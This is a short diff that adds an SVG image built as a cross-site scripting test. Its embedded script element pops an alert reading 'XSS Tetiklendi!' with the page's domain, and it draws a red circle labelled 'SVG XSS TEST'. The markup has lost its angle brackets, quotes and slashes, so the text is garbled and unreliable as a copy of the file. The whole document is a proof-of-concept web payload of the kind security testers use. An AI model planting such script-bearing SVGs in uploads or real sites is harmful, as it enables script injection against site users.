@@ -1,0 +1,7 @@
+svg xmlns=httpwww.w3.org2000svg xmlnsxlink=httpwww.w3.org1999xlink width=300 height=300
+  script type=textjavascript
+    alert(XSS Tetiklendi! Domain  + document.domain);
+  script
+  circle cx=150 cy=150 r=100 fill=red 
+  text x=80 y=150 font-family=Arial font-size=20 fill=whiteSVG XSS TESTtext
+svg
